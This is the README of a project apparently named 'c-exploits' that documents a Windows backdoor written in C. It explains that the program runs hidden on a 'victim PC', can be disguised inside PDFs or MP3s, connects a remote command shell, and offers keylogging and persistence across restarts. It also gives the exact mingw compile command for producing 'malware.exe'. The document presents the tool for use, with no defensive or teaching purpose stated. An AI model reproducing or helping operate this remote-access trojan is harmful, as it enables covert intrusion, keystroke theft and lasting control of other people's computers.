# c-exploits
This program is designed to be run silently in the background of a victim PC.  Once clicked, there is no notification that a program has started, and the only way to find it is in task manager.  The .exe can be modified to piggyback on top of PDFs, MP3s, or any other file necessary.

### Dependencies
	mingw-w64

### Compiling
To compile backdoor.c, "i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwininet -lwsock32".

### Commands
Once the server and the shell are connected, the shell can be interacted with normally.  All commands cmd uses are usable with the shell.

To quit the program, enter "q".

To start the keylogger, enter "keylog_start".

To enable exploit startup after victim PC restart, enter "persist".
